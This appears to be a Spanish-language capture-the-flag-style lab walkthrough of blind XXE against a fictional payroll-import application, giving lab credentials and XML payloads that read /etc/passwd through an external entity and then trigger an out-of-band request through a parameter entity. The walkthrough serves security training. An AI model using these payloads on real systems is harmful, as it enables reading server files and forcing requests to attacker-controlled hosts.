---
title: XXE a ciegas por entidad de parámetro (Valdora)
date: 2026-10-21
mermaid: true
categories: [ZHacksLabs, "XML External Entity"]
tags: ["XXE","Blind", "Blind XXE", "OOB"]
---

---

Vamos a ver la aplicación web:

![](/assets/images/zh/xxe/xxe-a-ciegas-por-entidad-de-parametro-valdora/1.png)

Vamos a dalre a `Entrar al panel` donde nos darán las siguientes credenciales de acceso:
- `l.marin`:`Valdora-2026`

Vamos a iniciar sesión:

![](/assets/images/zh/xxe/xxe-a-ciegas-por-entidad-de-parametro-valdora/2.png)

Vamosa probar la funcionalidad *Importar remesa de pagos*:

![](/assets/images/zh/xxe/xxe-a-ciegas-por-entidad-de-parametro-valdora/3.png)

Vamos a ver que solicitud realiza:

![](/assets/images/zh/xxe/xxe-a-ciegas-por-entidad-de-parametro-valdora/4.png)

Vemos que los datos que se envian lo hacen mediante XML, enviando el documento entero *(Ya exlcuyendo totalmente XXE basado en XInclude)*. Vamos a crear un nuevo **Document Type Definition** *(DTD)*, donde definiremos una entidad externa donde su valor será el uso del esquema URL `file://` apuntando al `/etc/passwd`:

*Payload*:
```xml
<!DOCTYPE test [<!ENTITY data SYSTEM "file:///etc/passwd">]>
```

Vamos a añadirlo al documento XML que se envía, llamando a nuestra entidad externa `&data;`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY data SYSTEM "file:///etc/passwd">]>
<remesa><concepto>nominas</concepto><referencia>&data;</referencia></remesa>
```

Vamos a probarlo:

![](/assets/images/zh/xxe/xxe-a-ciegas-por-entidad-de-parametro-valdora/5.png)

Vemos que la aplicación web nos bloquea el uso de entidades externas, vamos a probar a usar una entidad de parámetro externa. En este caso no apuntaremos a intentar leer un archivo y vamos a intentar que haga una solicitud a nuestro servidor:

```xml
<!DOCTYPE test [<!ENTITY % data SYSTEM "https://63e9b544a7.oob.valdora.lab"> %data;]>
```

Vamos a ponerlo en el cuerpo de solicitud en el documento XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % data SYSTEM "https://63e9b544a7.oob.valdora.lab"> %data;]>
<remesa><concepto>nominas</concepto><referencia>a</referencia></remesa>
```

![](/assets/images/zh/xxe/xxe-a-ciegas-por-entidad-de-parametro-valdora/6.png)

![](/assets/images/zh/xxe/xxe-a-ciegas-por-entidad-de-parametro-valdora/7.png)

---